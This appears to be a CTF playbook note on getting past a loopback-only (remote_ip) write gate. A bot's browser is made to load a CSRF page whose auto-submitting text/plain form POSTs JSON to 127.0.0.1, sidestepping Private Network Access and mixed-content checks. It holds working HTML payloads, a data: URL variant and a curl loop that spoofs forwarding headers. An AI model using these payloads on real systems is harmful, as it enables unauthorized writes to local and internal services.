# Private Network Access and the loopback write — the TornadoService gate

When the write is gated by `remote_ip`/`localhost`, the privileged
client is whoever can reach the loopback — and the bot's browser is
exactly that.

---

## 1. The gate shapes

```python
# the remote_ip check — reads the socket peer
if request.remote_ip != '127.0.0.1': abort(403)
if c.Request.RemoteAddr != '127.0.0.1:...': ...
if request.META['REMOTE_ADDR'] != '127.0.0.1': ...
if client_ip() not in ('127.0.0.1','::1'): ...
```

```text
- the socket peer is NOT a header — X-Forwarded-For/X-Real-IP/
  Forwarded/Host spoofing all fail (the card's falsifier)
- the socket peer is whoever opens the TCP connection — for the
  bot's browser, that's the bot's own 127.0.0.1
```

## 2. The "the bot IS the local client" primitive

```text
your request to /update → socket peer = your IP → 403
the bot's browser requests /update → socket peer = 127.0.0.1 → pass

a CSRF page the bot loads contains a form POSTing to
http://127.0.0.1:<port>/<endpoint> — from the bot's context,
127.0.0.1 is the bot itself, and the endpoint is on the bot's host.
```

## 3. Private Network Access — the browser-side gate

```text
Chrome's PNA: a PUBLIC-context page (https://attacker.com) can't
make a request to a PRIVATE address (127.0.0.1, RFC1918) without
a preflight — for 'private' requests from public contexts, Chrome
sends a CORS-preflight with Access-Control-Request-Private-Network.
the target must answer 'Access-Control-Allow-Private-Network: true'
for a fetch to proceed.
```

PNA affects `fetch`/`xhr` — a FORM NAVIGATION is NOT PNA-gated the
same way. the card's shape: a form top-level nav to 127.0.0.1 works
where a fetch is preflight-blocked.

## 4. The PNA-safe delivery — the form nav

```html
<!-- a form POST to loopback — a navigation, not a private-network
     fetch → PNA doesn't preflight it -->
<form id="f" action="http://127.0.0.1:1337/update_tornado" method="POST" enctype="text/plain">
  <input name='{"machine_id":"host-1051","ignore":"' value='"}'>
</form>
<script>document.getElementById('f').submit()</script>
```

The form nav escapes the fetch's PNA preflight — the browser treats
it as a navigation, not a programmatic request.

## 5. The mixed-content wrinkle

```text
an https page POSTing to http://127.0.0.1 → 'mixed content' block.
the page must be http (not https) or a data: URL for the loopback
POST to fire. or the endpoint must be https-loopback (rare).
```

```html
<!-- a data: page — no scheme conflict -->
data:text/html,<form action="http://127.0.0.1/x" method=POST>...
```

## 6. The internal-hostname variant — not just 127.0.0.1

```text
a docker-compose service name: app:, web:, backend:, api:
an internal DNS: service.internal, host.docker.internal
an RFC1918: 10.x, 172.16.x, 192.168.x — all 'private' for PNA
the bot's browser resolves the internal name → the loopback-adjacent
write lands on the internal service
```

```bash
# the internal names from the deployment config
grep -rnoE 'http://[a-z_-]+(:[0-9]+)?/|hostname|container_name|services:' \
  <src> --include='*.yml' --include='*.yaml' | head -20
```

## 7. The gate's alternative — a proxy that trusts a header

```text
some 'localhost' checks read a PROXY-set header, not the socket:
  if (req.headers['x-real-ip'] === '127.0.0.1') — spoofable!
  if (req.headers['x-forwarded-for'].includes('127.0.0.1')) — spoofable
the card's lesson: TEST whether the gate reads a header or the
socket — spoof the headers first; if they all fail, it's the socket
and the bot is the vector.
```

```bash
# the header-spoof test — before assuming the bot is needed
for h in 'X-Forwarded-For: 127.0.0.1' 'X-Real-IP: 127.0.0.1' \
         'Forwarded: for=127.0.0.1' 'X-Client-IP: 127.0.0.1' \
         'Host: localhost'; do
  curl -i -X POST "$BASE/update" -d 'a=1' -H "$h"; done
# all fail → the gate reads the socket → the bot is the only local client
```

## 8. The "the bot can't reach your host" case

```text
the bot runs inside the challenge's network — it can reach loopback
and internal names but NOT your external https://attacker.com. then
the CSRF page must live somewhere the bot CAN fetch:
- a data: URL submitted to the bot
- a stored page on the target
- a blob/iframe srcdoc
```

## 9. The composite — the full TornadoService shape

```text
the CSRF page (http or data:):
  <meta name=referrer content=no-referrer>     → strip Referer
  <form action="http://127.0.0.1:1337/update"   → loopback target
          method=POST enctype=text/plain>      → the JSON carrier
    <input name='{"machine_id":"h","ignore":"' value='"}'>
  </form>
  <script>document.forms[0].submit()</script>   → a form nav, PNA-safe
the bot loads it → the form POSTs to the bot's own loopback → the
remote_ip gate passes → the write lands.
```

## 10. The falsifier

```text
- the gate reads a header you CAN spoof → skip the bot entirely
- the endpoint isn't on the bot's loopback → unreachable
- the bot's browser enforces PNA even on form navs → the write
  doesn't fire (a hardened modern chromium)
- no bot exists → no local client → dead
```

## 11. The ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "loopback-gate: remote_ip==127.0.0.1; bot-as-local-client via form nav"
```
